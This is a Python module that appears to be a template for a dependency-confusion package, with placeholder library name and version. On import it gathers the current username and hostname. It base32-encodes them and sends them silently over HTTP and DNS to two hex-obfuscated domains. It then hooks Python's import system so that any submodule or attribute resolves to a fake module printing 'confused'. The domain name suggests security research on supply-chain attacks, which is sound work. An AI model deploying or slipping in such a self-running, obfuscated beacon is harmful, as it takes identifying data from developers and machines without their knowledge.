import base64
import getpass
import json
import socket
import sys
import http.client
import types
from importlib.util import spec_from_loader

SU = bytes.fromhex("646570656e64656e63792d636f6e667573696f6e2e7365632d6c61622e6974").decode("utf-8")
UTR = bytes.fromhex("6233322e73696d706c6573742d736f6c7574696f6e732e706c").decode("utf-8")
LIBNAME = "PLACEHOLDER_LIBNAME"
VERSION = "PLACEHOLDER_VERSION"


def get_payload():
    
    return {
        "un": getpass.getuser(),
        "hn": socket.gethostname(),
        "ln": LIBNAME,
        "lv": VERSION,
    }


def encode_payload(payload):
    
    json_str = json.dumps(payload)
    return base64.b32encode(json_str.encode()).decode()


def make_request(encoded_data):
    try:
        conn = http.client.HTTPConnection(SU, timeout=0.1)
        conn.request("GET", "/?data={}".format(encoded_data))
        conn.getresponse()
        conn.close()
    except Exception:
        pass
    
    return None


def make_dns_request(encoded_data):
    try:
        encoded_data = encoded_data.rstrip('=')
        segment_size = 60
        segments = [
            encoded_data[i:i+segment_size] 
            for i in range(0, len(encoded_data), segment_size)
        ]
        segmented_subdomain = '.'.join(segments)
        target_domain = "{}.{}".format(segmented_subdomain, UTR)
        socket.gethostbyname(target_domain)
    except Exception:
        pass
    
    return None

payload = get_payload()
encoded = encode_payload(payload)
make_request(encoded)
make_dns_request(encoded)


__path__ = []
_current_package_name = None

class DynamicLoader:
    def create_module(self, spec):
        fullname = spec.name
        parts = fullname.split('.')
        if len(parts) > 1:
            parent_name = '.'.join(parts[:-1])
            module_name = parts[-1]
            module = DynamicModule(module_name, parent_name=parent_name)
        else:
            module = DynamicModule(fullname)
        sys.modules[fullname] = module
        return module
    
    def exec_module(self, module):
        pass
    
    def load_module(self, fullname):
        if fullname in sys.modules:
            return sys.modules[fullname]
        raise ImportError("Module loading not supported")

class DynamicImportFinder:
    
    def find_spec(self, fullname, path, target=None):
        if '.' not in fullname:
            return None
        parts = fullname.split('.')
        root_module_name = parts[0]
        if root_module_name in sys.modules:
            root_module = sys.modules[root_module_name]
            if isinstance(root_module, DynamicModule) or hasattr(root_module, '__path__'):
                if fullname in sys.modules:
                    return None
                loader = DynamicLoader()
                spec = spec_from_loader(fullname, loader, origin='<dynamic>')
                return spec
        return None

class DynamicModule(types.ModuleType):
    
    _special_attrs = {'__file__', '__path__', '__name__', '__package__', '__spec__', '__loader__'}
    
    def __init__(self, name, parent_name=None, doc=None):
        if parent_name:
            full_name = "{}.{}".format(parent_name, name)
        else:
            full_name = name
        super().__init__(full_name, doc=doc or "Dynamic module")
        self._parent_name = parent_name
        self._name = name
        object.__setattr__(self, '__file__', '<dynamic>')
        object.__setattr__(self, '__path__', [])
        loader = DynamicLoader()
        spec = spec_from_loader(full_name, loader, origin='<dynamic>')
        object.__setattr__(self, '__spec__', spec)
        object.__setattr__(self, '__loader__', loader)
        if full_name not in sys.modules:
            sys.modules[full_name] = self
    
    def __getattr__(self, name):
        if name in self._special_attrs:
            raise AttributeError("module '{}' has no attribute '{}'".format(self.__name__, name))
        print("confused")
        full_name = "{}.{}".format(self.__name__, name)
        if full_name in sys.modules:
            return sys.modules[full_name]
        nested_module = DynamicModule(name, parent_name=self.__name__)
        sys.modules[full_name] = nested_module
        return nested_module

def __getattr__(name):
    print("confused")
    current_package = __name__
    full_name = "{}.{}".format(current_package, name)
    if full_name in sys.modules:
        return sys.modules[full_name]
    module = DynamicModule(name, parent_name=current_package)
    sys.modules[full_name] = module
    return module

_current_package_name = __name__
finder = DynamicImportFinder()
if finder not in sys.meta_path:
    sys.meta_path.insert(0, finder)
